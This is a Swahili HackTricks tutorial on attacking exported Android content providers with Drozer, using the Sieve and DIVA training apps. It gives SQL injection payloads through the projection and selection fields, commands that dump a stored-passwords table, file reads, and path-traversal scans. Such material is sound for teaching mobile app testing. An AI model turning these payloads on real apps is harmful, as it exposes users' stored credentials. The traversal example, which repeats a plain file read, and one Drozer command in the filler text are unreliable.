# Kudukiza Watoaji wa Yaliyomo

## Kudukiza Watoaji wa Yaliyomo

<details>

<summary><strong>Jifunze kudukiza AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa katika HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukiza kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Utangulizi

Data inatolewa kutoka kwa programu moja kwenda nyingine kwa ombi la kifaa kinachojulikana kama **watoaji wa yaliyomo**. Maombi haya yanadhibitiwa kupitia njia za darasa la **ContentResolver**. Watoaji wa yaliyomo wanaweza kuhifadhi data yao katika maeneo mbalimbali, kama vile **database**, **faili**, au kupitia **mtandao**.

Katika faili ya _Manifest.xml_, tangazo la watoaji wa yaliyomo linahitajika. Kwa mfano:
```xml
<provider android:name=".DBContentProvider" android:exported="true" android:multiprocess="true" android:authorities="com.mwr.example.sieve.DBContentProvider">
<path-permission android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" android:path="/Keys"/>
</provider>
```
Kuweza kufikia `content://com.mwr.example.sieve.DBContentProvider/Keys`, inahitajika ruhusa ya `READ_KEYS`. Ni muhimu kufahamu kwamba njia ya `/Keys/` inaweza kufikiwa katika sehemu ifuatayo, ambayo haijalindwa kutokana na kosa la mwandishi wa programu, ambaye alilinda `/Keys` lakini alitangaza `/Keys/`.

**Labda unaweza kupata data binafsi au kutumia kasoro fulani (SQL Injection au Path Traversal).**

## Pata habari kutoka kwa **watoaji wa yaliyomo yaliyofichuliwa**
```
dz> run app.provider.info -a com.mwr.example.sieve
Package: com.mwr.example.sieve
Authority: com.mwr.example.sieve.DBContentProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.DBContentProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
Path Permissions:
Path: /Keys
Type: PATTERN_LITERAL
Read Permission: com.mwr.example.sieve.READ_KEYS
Write Permission: com.mwr.example.sieve.WRITE_KEYS
Authority: com.mwr.example.sieve.FileBackupProvider
Read Permission: null
Write Permission: null
Content Provider: com.mwr.example.sieve.FileBackupProvider
Multiprocess Allowed: True
Grant Uri Permissions: False
```
Inawezekana kuunganisha jinsi ya kufikia **DBContentProvider** kwa kuanza URIs na "_content://_". Njia hii inategemea ufahamu uliopatikana kwa kutumia Drozer, ambapo habari muhimu ilipatikana katika saraka ya _/Keys_.

Drozer inaweza **kudhani na kujaribu URIs kadhaa**:
```
dz> run scanner.provider.finduris -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/
...
Unable to Query content://com.mwr.example.sieve.DBContentProvider/Keys
Accessible content URIs:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
```
Unapaswa pia kuangalia **msimbo wa ContentProvider** ili kutafuta maswali:

![](<../../../.gitbook/assets/image (121) (1) (1) (1).png>)

Pia, ikiwa huwezi kupata maswali kamili, unaweza **kuangalia majina yaliyotangazwa na ContentProvider** kwenye njia ya `onCreate`:

![](<../../../.gitbook/assets/image (186).png>)

Swali litakuwa kama: `content://jina.la.pakiti.darasa/jina_lililotangazwa`

## **Watoaji wa Yaliyomo Yaliyohifadhiwa kwenye Database**

Labda watoaji wengi wa yaliyomo hutumiwa kama **interface** kwa **database**. Kwa hivyo, ikiwa unaweza kufikia hiyo, unaweza kuwa na uwezo wa **kuchukua, kusasisha, kuingiza na kufuta** habari.\
Angalia ikiwa unaweza **kufikia habari nyeti** au jaribu kubadilisha ili **kipuuzie** mifumo ya idhini.

Unapoangalia msimbo wa Watoaji wa Yaliyomo, **tafuta** pia kazi zilizo na majina kama: _swali, ingiza, sasisha na futa_:

![](<../../../.gitbook/assets/image (187).png>)

![](<../../../.gitbook/assets/image (254) (1) (1) (1) (1) (1) (1) (1).png>)

Kwa sababu utaweza kuziita
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
_id: 1
service: Email
username: incognitoguy50
password: PSFjqXIMVa5NJFudgDuuLVgJYFD+8w==
-
email: incognitoguy50@gmail.com
```
### Ingiza yaliyomo

Kwa kuuliza kwenye database utajifunza **jina la safu**, kisha, utaweza kuweka data kwenye DB:

![](<../../../.gitbook/assets/image (188) (1).png>)

![](<../../../.gitbook/assets/image (189) (1).png>)

_Taarifa kwamba katika kuweka na kusasisha unaweza kutumia --string kuashiria string, --double kuashiria double, --float, --integer, --long, --short, --boolean_

### Sasisha yaliyomo

Ukiwa na jina la safu unaweza pia **kubadilisha maelezo**:

![](<../../../.gitbook/assets/image (190).png>)

### Futa yaliyomo

![](<../../../.gitbook/assets/image (191).png>)

### **SQL Injection**

Ni rahisi kujaribu SQL injection **(SQLite)** kwa kubadilisha **projection** na **selection fields** ambazo zinapitishwa kwa content provider.\
Wakati wa kuuliza Content Provider kuna hoja 2 za kuvutia za kutafuta habari: _--selection_ na _--projection_:

![](<../../../.gitbook/assets/image (192) (1).png>)

Unaweza kujaribu **kutumia vibaya** hizi **parameta** kwa kujaribu SQL injections:
```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"
unrecognized token: "')" (code 1): , while compiling: SELECT * FROM Passwords WHERE (')
```

```
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "*
FROM SQLITE_MASTER WHERE type='table';--"
| type  | name             | tbl_name         | rootpage | sql              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE ... |
| table | Passwords        | Passwords        | 4        | CREATE TABLE ... |
```
**Kugundua SQLInjection kiotomatiki kwa kutumia Drozer**

Drozer ni chombo cha kiotomatiki cha kufanya upimaji wa usalama kwenye programu za Android. Moja ya uwezo wake ni kugundua mashimo ya usalama kwenye Content Providers ambayo yanaweza kusababisha mashambulizi ya SQLInjection.

Kwa kutumia Drozer, unaweza kufanya uchunguzi wa kiotomatiki kwenye programu za Android ili kugundua ikiwa zina hatari ya SQLInjection. Chombo hiki kinaweza kugundua mashimo ya usalama kwa kutuma maombi maalum kwenye Content Providers na kuchambua majibu yaliyopokelewa.

Ili kutumia Drozer kugundua mashimo ya usalama, unahitaji kufuata hatua zifuatazo:

1. Sakinisha Drozer kwenye kifaa chako cha Android na kwenye mfumo wako wa uendeshaji wa kompyuta.
2. Weka kifaa chako cha Android na kompyuta kwenye mtandao mmoja.
3. Anza Drozer kwenye kifaa chako cha Android na kompyuta.
4. Tumia amri za Drozer kuchunguza programu za Android na kugundua mashimo ya usalama kwenye Content Providers.

Kwa kufuata hatua hizi, Drozer itafanya uchunguzi wa kiotomatiki na kukupa matokeo ya kugundua mashimo ya usalama kwenye Content Providers. Hii itakusaidia kuchukua hatua za kurekebisha mashimo hayo na kuimarisha usalama wa programu yako ya Android.
```
dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Injection in Projection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/
Injection in Selection:
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a jakhar.aseem.diva
Scanning jakhar.aseem.diva...
Accessible tables for uri content://jakhar.aseem.diva.provider.notesprovider/notes/:
android_metadata
notes
sqlite_sequence
```
## **Watoaji wa Yaliyomo Yaliyohifadhiwa kwenye Mfumo wa Faili**

Watoaji wa yaliyomo wanaweza pia kutumika kufikia faili:

![](<../../../.gitbook/assets/image (193).png>)

### Soma **faili**

Unaweza kusoma faili kutoka kwa Watoaji wa Yaliyomo
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
### **Ufuatiliaji wa Njia**

Ikiwa unaweza kupata faili, unaweza kujaribu kutumia Ufuatiliaji wa Njia (katika kesi hii haitakuwa muhimu lakini unaweza kujaribu kutumia "_../_" na mbinu kama hizo).
```
dz> run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts
127.0.0.1            localhost
```
**Kugundua Ufikiaji wa Njia kiotomatiki kwa kutumia Drozer**

Drozer ni chombo cha kufanya ukaguzi wa usalama kwenye programu za Android. Moja ya uwezo wake ni kugundua ufikiaji wa njia kiotomatiki kwenye programu. Ufikiaji wa njia kiotomatiki ni kasoro ambapo mtumiaji anaweza kupata ufikiaji usioidhinishwa kwa faili au folda zilizolindwa.

Kwa kutumia Drozer, tunaweza kugundua ufikiaji wa njia kiotomatiki kwa kutumia mbinu ya "path traversal". Mbinu hii inaruhusu mtumiaji kufikia faili au folda ambazo hazijaruhusiwa kwa kubadilisha njia ya faili iliyotolewa na programu.

Drozer inatoa moduli ya "path_traversal" ambayo inaweza kutumika kugundua ufikiaji wa njia kiotomatiki. Moduli hii inafanya jaribio la kufikia faili au folda zilizolindwa kwa kubadilisha njia ya faili iliyotolewa na programu. Ikiwa ufikiaji wa njia kiotomatiki unapatikana, basi programu inaweza kuwa na kasoro ya usalama.

Kwa kuanza, tunahitaji kuanzisha mazingira ya Drozer na kuunganisha kifaa cha Android. Baada ya hapo, tunaweza kutumia amri ifuatayo kugundua ufikiaji wa njia kiotomatiki:

```
dz> run app.provider.finduri content://com.example.app/
```

Amri hii itafanya jaribio la kugundua ufikiaji wa njia kiotomatiki kwenye programu iliyotajwa. Ikiwa ufikiaji wa njia kiotomatiki unapatikana, Drozer itatoa maelezo ya njia iliyopatikana.

Kwa kutumia Drozer, tunaweza kugundua na kuchunguza ufikiaji wa njia kiotomatiki kwenye programu za Android. Hii inatusaidia kubaini kasoro za usalama na kuchukua hatua za kuzifunga.
```
dz> run scanner.provider.traversal -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Vulnerable Providers:
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.FileBackupProvider
```
## Marejeo

* [https://www.tutorialspoint.com/android/android\_content\_providers.htm](https://www.tutorialspoint.com/android/android\_content\_providers.htm)
* [https://manifestsecurity.com/android-application-security-part-15/](https://manifestsecurity.com/android-application-security-part-15/)
* [https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf](https://labs.withsecure.com/content/dam/labs/docs/mwri-drozer-user-guide-2015-03-23.pdf)

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PR kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
